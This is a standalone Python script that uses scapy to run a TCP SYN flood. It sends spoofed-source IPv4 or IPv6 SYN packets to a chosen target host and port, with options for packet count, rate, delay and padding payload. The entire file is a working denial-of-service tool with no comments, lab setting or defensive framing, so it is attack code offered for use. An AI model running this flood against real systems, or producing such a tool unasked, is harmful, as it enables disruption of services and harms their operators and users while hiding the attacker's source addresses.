#!/usr/bin/python3
from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser
from time import sleep
def randomIP():
	ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
	return ip

def randInt():
	x = randint(1000, 9000)
	return x

def SYN_Flood(dstIP, dstPort, counter, delay_s=0, payload_size=0):
	total = 0
	print ("IPv4 Packets are sending ...")

	for x in range (0, counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = int(dstPort)
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		packet = IP_Packet/TCP_Packet
		if payload_size > 0:
			packet = packet/Raw(load=b"X" * payload_size)
		send(packet, verbose=0)
		total+=1
		if delay_s > 0:
			sleep(delay_s)

	stdout.write("\nTotal packets sent: %i\n" % total)

def SYN_Flood_v6(dstIP, dstPort, counter, delay_s=0, payload_size=0):
	total = 0
	print ("IPv6 Packets are sending ...")

	for x in range (0, counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IPv6 ()
		IP_Packet.src = RandIP6()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = int(dstPort)
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		packet = IP_Packet/TCP_Packet
		if payload_size > 0:
			packet = packet/Raw(load=b"X" * payload_size)
		send(packet, verbose=0)
		total+=1
		if delay_s > 0:
			sleep(delay_s)

	stdout.write("\nTotal packets sent: %i\n" % total)

def main():
	parser = ArgumentParser()
	parser.add_argument('--target', '-t')
	parser.add_argument('--port', '-p')
	parser.add_argument('--count', '-c')
	parser.add_argument('--format', '-f')
	parser.add_argument('--delay-ms', type=float, default=0)
	parser.add_argument('--rate-pps', type=float, default=0)
	parser.add_argument('--payload-size', type=int, default=0)

	args = parser.parse_args()

	if args.target is not None:
		if args.port is not None:
			delay_s = 0
			if args.rate_pps and args.rate_pps > 0:
				delay_s = 1 / args.rate_pps
			elif args.delay_ms and args.delay_ms > 0:
				delay_s = args.delay_ms / 1000

			if args.count is None:
				SYN_Flood(args.target, args.port, 1, delay_s, args.payload_size)
			else:
				print(f"args.format = {args.format}")
				if args.format == '6':
					SYN_Flood_v6(args.target, args.port, int(args.count), delay_s, args.payload_size)
				else:
					SYN_Flood(args.target, args.port, int(args.count), delay_s, args.payload_size)
main()
